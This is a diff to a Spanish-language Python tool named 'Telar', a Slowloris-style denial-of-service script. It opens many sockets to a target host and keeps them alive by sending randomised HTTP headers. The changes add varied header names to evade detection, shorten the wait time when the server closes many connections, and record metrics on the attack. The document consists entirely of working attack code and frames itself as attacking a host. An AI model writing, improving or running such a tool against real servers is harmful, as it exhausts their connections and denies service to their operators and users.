@@ -2,33 +2,60 @@
 import logging
 import time
 import socket
+import random
 from configuracion import args
 from red import iniciar_socket
+from metricas import iniciar_log_metricas, registrar_iteracion, finalizar_log
 
 lista_sockets = []
+ajustes_dinamicos_activados = True
 
 def iteracion_telar():
     logging.info("Enviando encabezados keep-alive...")
     logging.info("Cantidad de sockets: %s", len(lista_sockets))
 
+    cerrados = 0
+    inicio_iteracion = time.time()
+
     for s in list(lista_sockets):
         try:
-            s.enviar_encabezado("X-a", str(random.randint(1, 5000)))
-        except socket.error:
+            cantidad_headers = random.randint(3, 6)
+            for _ in range(cantidad_headers):
+                nombre = f"X-{random.choice(['a','b','c','d','e','keep','ping'])}-{random.randint(1, 100)}"
+                valor = str(random.randint(1000, 999999))
+                s.enviar_encabezado(nombre, valor)
+        except socket.error as e:
+            mensaje = str(e).lower()
+            if "timed out" in mensaje or "reset" in mensaje or "broken pipe" in mensaje:
+                logging.debug("⚠️ Socket cerrado por el servidor: %s", mensaje)
+            else:
+                logging.debug("⚠️ Socket cerrado inesperadamente: %s", mensaje)
             lista_sockets.remove(s)
+            cerrados += 1
 
     faltan = args.sockets - len(lista_sockets)
-    if faltan <= 0:
-        return
+    nuevos = 0
+    if faltan > 0:
+        logging.info("Creando %s nuevos sockets...", faltan)
+        for _ in range(faltan):
+            try:
+                s = iniciar_socket(args.host)
+                lista_sockets.append(s)
+                nuevos += 1
+            except socket.error as e:
+                logging.debug("Fallo al crear nuevo socket: %s", e)
+                break
 
-    logging.info("Creando %s nuevos sockets...", faltan)
-    for _ in range(faltan):
-        try:
-            s = iniciar_socket(args.host)
-            lista_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Fallo al crear nuevo socket: %s", e)
-            break
+    if ajustes_dinamicos_activados and cerrados > 0:
+        porcentaje_cerrados = (cerrados / (cerrados + len(lista_sockets))) * 100
+        if porcentaje_cerrados > 30 and args.tiempo_espera > 3:
+            args.tiempo_espera -= 1
+            logging.warning("⚠️ Muchos sockets cerrados (%d%%). Reduciendo tiempo de espera a %ds.",
+                            int(porcentaje_cerrados), args.tiempo_espera)
+
+    duracion_ms = (time.time() - inicio_iteracion) * 1000
+    registrar_iteracion(len(lista_sockets), cerrados, nuevos, duracion_ms, args.tiempo_espera)
+    logging.debug("🕒 Sleeptime actual: %ds", args.tiempo_espera)
 
 def ejecutar_telar():
     logging.basicConfig(
@@ -37,6 +64,7 @@ def ejecutar_telar():
         level=logging.DEBUG if args.verbose else logging.INFO,
     )
 
+    iniciar_log_metricas()
     ip = args.host
     logging.info("Atacando %s con %s sockets.", ip, args.sockets)
 
@@ -49,12 +77,21 @@ def ejecutar_telar():
             logging.debug("Error al crear socket inicial: %s", e)
             break
 
-    while True:
-        try:
+    try:
+        while True:
             iteracion_telar()
-        except (KeyboardInterrupt, SystemExit):
-            logging.info("Deteniendo Telar")
-            break
-        except Exception as e:
-            logging.debug("Error en iteración Telar: %s", e)
-        time.sleep(args.tiempo_espera)
+            time.sleep(args.tiempo_espera)
+    except (KeyboardInterrupt, SystemExit):
+        logging.info("Deteniendo Telar por interrupción del usuario.")
+        resumen = finalizar_log()
+        print("\n\n📊 RESUMEN FINAL")
+        print(resumen)
+    except Exception as e:
+        logging.debug("Error en ejecución Telar: %s", e)
+        resumen = finalizar_log()
+        print("\n\n📊 RESUMEN FINAL")
+        print(resumen)
+    else:
+        resumen = finalizar_log()
+        print("\n\n📊 RESUMEN FINAL")
+        print(resumen)
